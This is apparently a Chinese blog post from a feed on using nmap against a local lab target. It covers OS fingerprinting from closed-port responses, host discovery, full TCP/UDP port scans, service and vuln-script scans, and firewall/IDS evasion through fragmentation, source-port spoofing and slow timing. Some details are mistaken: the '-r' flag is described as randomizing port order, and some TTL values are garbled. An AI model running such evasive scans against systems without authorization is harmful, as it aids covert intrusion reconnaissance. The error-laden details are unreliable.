-不同操作系统的响应差异 操作系统/内核 TCP 关闭端口响应 ICMP 关闭端口响应 特征差异点 Linux 2.6 / 3.x / 4.x / 5.x 返回 RST，TTL 常见 64 UDP 端口不可达：Type 3，Code 3 窗口大小为 0，ICMP 报文长度与 Padding 一致 Windows XP / 2003 返回 RST，TTL 128 UDP 端口不可达：Type 3，Code 3 常常带有 ACK 标志，ICMP 报文长度较短 Windows 7 / 10 / Server 返回 RST，ATK，TTL 128 UDP 端口不可达：Type 3，Code 3 窗口大小与 XP 不同，ICMP 检验与算法不同 FreeBSD / OpenBSD 返回 RST，TTL 常见 64 UDP 端口不可达：Type 3，Code 3 ICMP 报文填充方式与 Linux 不同 Solaris 返回 RST，TTL 常见 255 UDP 端口不可达：Type 3，Code 3 高 TTL，RST 包含独特的窗口值 Cisco ISO / 路由器类设备 有时直接丢弃，无 RST UDP 常返回 ICMP Type 3，Code 13（Admin Prohibited） 偏向过滤回应，不遵循主机栈常见模式 MikroTik RouterOPS RST 响应 TTL -64 UDP 端口不可达：Type 3，Code 3 TCP 选项顺序与 Linux 内核不同，较易区分 Linux 通常是干净的 RST + TTL 64，Windows 多带 RST、ACK、TTL 12，BSD/Solaris 类似 Linux，但 TTL 、窗口值、ICMP 填充略有不同，网络设备、防火墙常返回 “禁止访问”（Code 13）或直接丢弃，不像常用 OS 。这些细微的差别叠加起来组成了 nmap 指纹库，使得 nmap 可以精确区分系统。</description><content type="html"><![CDATA[<blockquote>
-<p>以下命令均以 kali本地地址为 10.10.10.5，靶机地址为 10.10.10.45 为案例</p>
-</blockquote>
-<h2 id="nmap-扫描原理解析">nmap 扫描原理解析</h2>
-<p>nmap 的操作系统识别依赖于比较目标主机与关闭端口探测包的不同回应模式：开放端口会返回正常的握手或服务应答，而关闭端口则常见 RST 或 ICMP 拒绝，不同操作系统内核再这些细节（如 TCP、标志位、TTL、窗口大小、ICMP 码值）上存在差异，nmap 需要同时采集 “接受” 和 “拒绝” 两类样本，才能与指纹库准确比对。如果缺少关闭端口的反馈，就丢失了一半的特征维度，指纹信息不足，结果往往只能模糊匹配甚至误判，因此 nmap 会提示 “OSScan results may be unreliable”。</p>
-<h3 id="不同操作系统的响应差异">不同操作系统的响应差异</h3>
-<table>
-<thead>
-<tr>
-<th>操作系统/内核</th>
-<th>TCP 关闭端口响应</th>
-<th>ICMP 关闭端口响应</th>
-<th>特征差异点</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Linux 2.6 / 3.x / 4.x / 5.x</td>
-<td>返回 RST，TTL 常见 64</td>
-<td>UDP 端口不可达：Type 3，Code 3</td>
-<td>窗口大小为 0，ICMP 报文长度与 Padding 一致</td>
-</tr>
-<tr>
-<td>Windows XP / 2003</td>
-<td>返回 RST，TTL 128</td>
-<td>UDP 端口不可达：Type 3，Code 3</td>
-<td>常常带有 ACK 标志，ICMP 报文长度较短</td>
-</tr>
-<tr>
-<td>Windows 7 / 10 / Server</td>
-<td>返回 RST，ATK，TTL 128</td>
-<td>UDP 端口不可达：Type 3，Code 3</td>
-<td>窗口大小与 XP 不同，ICMP 检验与算法不同</td>
-</tr>
-<tr>
-<td>FreeBSD / OpenBSD</td>
-<td>返回 RST，TTL 常见 64</td>
-<td>UDP 端口不可达：Type 3，Code 3</td>
-<td>ICMP 报文填充方式与 Linux 不同</td>
-</tr>
-<tr>
-<td>Solaris</td>
-<td>返回 RST，TTL 常见 255</td>
-<td>UDP 端口不可达：Type 3，Code 3</td>
-<td>高 TTL，RST 包含独特的窗口值</td>
-</tr>
-<tr>
-<td>Cisco ISO / 路由器类设备</td>
-<td>有时直接丢弃，无 RST</td>
-<td>UDP 常返回 ICMP Type 3，Code 13（Admin Prohibited）</td>
-<td>偏向过滤回应，不遵循主机栈常见模式</td>
-</tr>
-<tr>
-<td>MikroTik RouterOPS</td>
-<td>RST 响应 TTL -64</td>
-<td>UDP 端口不可达：Type 3，Code 3</td>
-<td>TCP 选项顺序与 Linux 内核不同，较易区分</td>
-</tr>
-</tbody>
-</table>
-<p>Linux 通常是干净的 <code>RST + TTL 64</code>，Windows 多带 <code>RST、ACK、TTL 12</code>，BSD/Solaris 类似 Linux，但 TTL 、窗口值、ICMP 填充略有不同，网络设备、防火墙常返回 “禁止访问”（Code 13）或直接丢弃，不像常用 OS 。这些细微的差别叠加起来组成了 nmap 指纹库，使得 nmap 可以精确区分系统。</p>
-<h2 id="使用心得">使用心得</h2>
-<h3 id="主机发现">主机发现</h3>
-<p>在打本地离线靶机的时候常常需要主机发现，此时可以使用以下命令。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sn 10.10.10.0/24
-</span></span></code></pre></div><p>-sn 为 &ndash;skip -port-scan 的缩写，意思为不要执行传统的端口扫描，扫描地址为 0/24，该命令为笔者打本地离线机器最常用的主机发现命令，执行结果如下。</p>
-<p><img src="%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0.png" alt="主机发现"></p>
-<p>其中 10.10.10.1 与 10.10.10.2 、10.10.10.254是系统默认地址，10.10.10.5 是 kali 地址，所以 10.10.10.45 就是靶机的地址。</p>
-<h3 id="tcp-端口扫描">TCP 端口扫描</h3>
-<p>在主机发现后一般要对存活的机器进行端口扫描，可以使用以下命令。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap --min-rate <span style="color:#ae81ff">10000</span> -p- 10.10.10.45 -oA nmap/scan
-</span></span></code></pre></div><p>一般可以加上 -sT 指定对 TCP 端口进行扫描，但是实战中有时候指定 -sT 后反而扫描不全，所有去除 -sT；可以使用 -oA 命令将扫描结果全格式保存到 nmap/scan 目录下以便于随时回顾，命令执行结果如下。</p>
-<p><img src="TCP-scan.png" alt="TCP 扫描"></p>
-<p>可以发现靶机开放了 22 ssh 端口和 80 http 端口。</p>
-<h3 id="udp-端口扫描">UDP 端口扫描</h3>
-<p>在执行完 TCP 扫描后应该进行 UDP 扫描以免有漏掉的 UDP 端口，可以使用以下命令。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sU --min-rate <span style="color:#ae81ff">10000</span> -p- 10.10.10.45 -oA nmap/udp-scan
-</span></span></code></pre></div><p>命令结构与 TCP 扫描类似，多了个 -sU 指定对 UDP 端口进行扫描，执行结果如下。</p>
-<p><img src="UDP-scan.png" alt="UDP-scan"></p>
-<p>可以看到 UDP 没有扫描到开放的端口。</p>
-<h3 id="tcp-详细情况扫描">TCP 详细情况扫描</h3>
-<p>在扫描完成后要对 TCP 端口的详细情况进行扫描，可以使用以下命令。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -sT -sC -sV -O -p22,80 10.10.10.45 
-</span></span></code></pre></div><p>-sT 指定对 TCP 端口，-sC 使用默认脚本扫描，-sV 进行服务和版本的探测，-O 进行操作系统的探测，指定端口为 22,80，执行结果如下。</p>
-<p><img src="detail-scan.png" alt="detail-scan"></p>
-<p>可以看到 nmap 列出了端口详细情况。</p>
-<h3 id="默认脚本扫描">默认脚本扫描</h3>
-<p>在执行完端口详细扫描后一般还会执行 nmap 的 默认脚本扫描，可以执行以下命令。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap --script<span style="color:#f92672">=</span>vuln -p22,80 10.10.10.45
-</span></span></code></pre></div><p>&ndash;script=vuln 指定以 nmap 的默认脚本进行扫描，指定端口为 22、80，执行结果如下。</p>
-<p><img src="script-scan.png" alt="script-scan"></p>
-<p>可以看到 nmap 已经对端口进行了默认脚本扫描，并输出了结果。</p>
-<h3 id="数据包分片扫描">数据包分片扫描</h3>
-<p>有些防火墙或 WAF 在处理完整数据包时会进行检测，但对分片数据包的处理可能不完善。使用 -f 参数将 TCP 数据包分片，可能绕过某些防护设备检测。通过分片发送探测包，降低被拦截的概率，尝试发现隐藏的开放端口。</p>
-<p>一个完整的 IP 包包含：</p>
-<p><code>IP头 + TCP/UDP头 + 可能的应用层链路</code></p>
-<p>-f 参数在 IP 层将这个包拆成多片发送</p>
-<p><code>第一个分片：IP头 + TCP/UDP头 + 一段数据</code>
-<code>后续分片： IP头 + 剩余数据</code></p>
-<p>传统防火墙、简单包过滤器只检查第一个分片，直接放行后续数据包</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -f -p- --min-rate <span style="color:#ae81ff">10000</span> 10.10.10.45
-</span></span></code></pre></div><p><img src="bust-scan.png" alt="bust-scan"></p>
-<p>可以看到靶机开放了 22、80 端口。</p>
-<h3 id="源端口随机端口顺序慢速扫描">源端口、随机端口顺序、慢速扫描</h3>
-<h4 id="源端口扫描">源端口扫描</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap --source-port <span style="color:#ae81ff">53</span> -p- --min-rate <span style="color:#ae81ff">10000</span> 10.10.10.45
-</span></span></code></pre></div><p>防火墙可能允许特定源端口流量通过（例如 53 是 DNS 常用端口）。通过伪装端口为常用服务端口，坑那个绕过端口过滤规则，模拟合法流量，探测目标是否对特定源端口的请求有所响应。</p>
-<h4 id="随机端口扫描">随机端口扫描</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -r -p- --min-rate <span style="color:#ae81ff">10000</span> 10.10.10.45
-</span></span></code></pre></div><p>有些 WAF 或 IDS 会检测连续的端口扫描模式，使用 -r（按顺序扫描，但结合 &ndash;randomize-hosts 可随机化目标）可以打乱扫描顺序，降低被识别为扫描行为的可能性。通过非典型的扫描模式，尝试绕过基于模式匹配的防护规则。</p>
-<h4 id="慢速扫描">慢速扫描</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -T2 -p- 10.10.10.45
-</span></span></code></pre></div><p>使用更低速率的 T2 进行扫描，避免触发防火墙的阈值检测。</p>
-<blockquote>
-<p>T1 最慢，T5 最快</p>
-</blockquote>
-<h4 id="tcp-window-扫描">TCP Window 扫描</h4>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap --scanflags URGPSHFIN -p- --min-rate <span style="color:#ae81ff">10000</span> 10.10.10.45
-</span></span></code></pre></div><p>有些防火墙可能只过滤标准的 SYN 扫描，而对带有特定 TCP 标志（如 URG、PSH、FIN）的包处理不同。TCP 的 Window 扫描利用这些标志检测端口状态。通过发送非常规的 TCP 数据包，探测端口是否被影藏或误报为 filtered。</p>
-<blockquote>
-<p>URG：Uragent，紧急标志
-PSH：Push，推送标志
-FIN：finish，结束标志</p>
-</blockquote>
 ]]></content></item><item><title>Lampiao Writeup</title><link>https://enilmalus.github.io/posts/lampiao-writeup/</link><pubDate>Sun, 13 Jul 2025 17:29:33 +0800</pubDate><guid>https://enilmalus.github.io/posts/lampiao-writeup/</guid><description>Lampiao 靶机 环境：kali-linux-2025.1
 网络：nat
 攻击机ip：10.10.10.5
